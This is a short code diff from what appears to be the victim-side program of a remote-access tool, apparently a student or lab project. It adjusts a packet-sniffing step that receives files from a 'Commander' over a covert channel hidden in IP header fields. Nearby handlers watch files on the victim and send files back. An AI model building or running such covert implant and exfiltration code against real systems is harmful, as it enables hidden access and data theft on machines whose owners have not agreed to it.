@@ -217,8 +217,6 @@ if __name__ == '__main__':
                         client_socket.send((constants.STATUS_FALSE + "/" +
                                             constants.WATCH_FILE_NOT_EXIST_TO_CMDR.format(file_path)).encode())
 
-
-
                 # e) Receive File from Commander (Covert Channel)
                 if data.decode() == constants.TRANSFER_FILE_SIGNAL:
                     print(constants.CLIENT_RESPONSE.format(constants.TRANSFER_FILE_SIGNAL))
@@ -251,11 +249,14 @@ if __name__ == '__main__':
                         binary_data = selected_function(packet)
                         return binary_data
 
-                    # Start sniffing from the client
-                    received_packets = sniff(filter="src host {} or dst port {}".format(client_address[0],
-                                                                                        source_port), count=count)
+                    # DIFFERENT SNIFF: If choice is covert with IPv4/source IP address
+                    if constants.SOURCE_ADDRESS_FIELD in choices:
+                        received_packets = sniff(filter="src host {} or dst port {}".format(client_address[0],
+                                                                                            source_port), count=count)
+                    else:  # REGULAR SNIFF
+                        received_packets = sniff(filter="src host {}".format(client_address[0]), count=count)
 
-                    # Extract Data -> convert from binary to text -> write to file
+                    # Extract Data -> Convert from Binary to Text -> write to file
                     extracted_data = ''.join(packet_callback(packet)
                                              for packet in received_packets if packet_callback(packet))
                     covert_data_write_to_file(extracted_data, filename)
@@ -266,7 +267,6 @@ if __name__ == '__main__':
                         client_socket.send(constants.VICTIM_ACK.encode())
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
-
 
                 # f) Transfer file to Commander
                 if data.decode() == constants.GET_FILE_SIGNAL:
